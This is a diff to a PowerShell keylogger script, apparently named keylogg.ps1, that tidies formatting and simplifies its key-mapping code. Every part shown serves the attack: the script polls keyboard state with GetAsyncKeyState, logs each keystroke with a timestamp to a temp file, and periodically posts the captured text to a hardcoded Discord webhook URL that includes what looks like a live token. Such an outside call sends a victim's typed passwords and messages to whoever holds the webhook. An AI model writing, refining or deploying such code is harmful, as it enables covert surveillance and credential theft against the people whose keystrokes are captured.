@@ -1,4 +1,3 @@
-
 $discordWebhookUrl = "https://discord.com/api/webhooks/1287792319067721779/wvStZi9TsQ45RyDIXwxA4XeuQyDDgxQErSpsAaVmjHaszH6VWO4RhUlD7id8JPIMRn_K"
 $keylogFilePath = "$env:temp\keylogs.txt"
 
@@ -21,13 +20,9 @@ function Send-DiscordMessage {
     )
 
     try {
-        $body = @{
-            content = $Content
-        } | ConvertTo-Json
-
+        $body = @{ content = $Content } | ConvertTo-Json
         Invoke-WebRequest -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body $body
-    }
-    catch {
+    } catch {
     }
 }
 
@@ -40,8 +35,7 @@ function LogKeystrokesToFile {
         $timestamp = Get-Date -Format "HH:mm:ss"
         $formattedContent = "[$timestamp] $Content"
         Add-Content -Path $keylogFilePath -Value $formattedContent -Encoding UTF8
-    }
-    catch {
+    } catch {
     }
 }
 
@@ -55,8 +49,7 @@ function SendKeylogsFromFile {
         } else {
             Send-DiscordMessage -Content "No keystrokes recorded in the last 30 seconds."
         }
-    }
-    catch {
+    } catch {
     }
 }
 
@@ -71,12 +64,8 @@ function KeyLogger {
             $keystate = $API::GetAsyncKeyState($ascii)
 
             if ($keystate -eq -32767) {
-                $null = [console]::CapsLock
-
-                $mapKey = $API::MapVirtualKey($ascii, 3)
-
                 $keyboardState = New-Object Byte[] 256
-                $hideKeyboardState = $API::GetKeyboardState($keyboardState)
+                $API::GetKeyboardState($keyboardState) | Out-Null
                 $loggedchar = New-Object -TypeName System.Text.StringBuilder
 
                 switch ($ascii) {
@@ -89,8 +78,8 @@ function KeyLogger {
                     20  { $buffer += "[CAPSLOCK]" }
                     32  { $buffer += " " }
                     default {
-                        if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
-                            $buffer += $loggedchar
+                        if ($API::ToUnicode($ascii, 0, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
+                            $buffer += $loggedchar.ToString()
                         }
                     }
                 }
@@ -116,4 +105,3 @@ function KeyLogger {
 if (-not [System.Diagnostics.Process]::GetProcessesByName("powershell").Where({$_.MainWindowTitle -match 'keylogg.ps1'})) {
     KeyLogger
 }
-
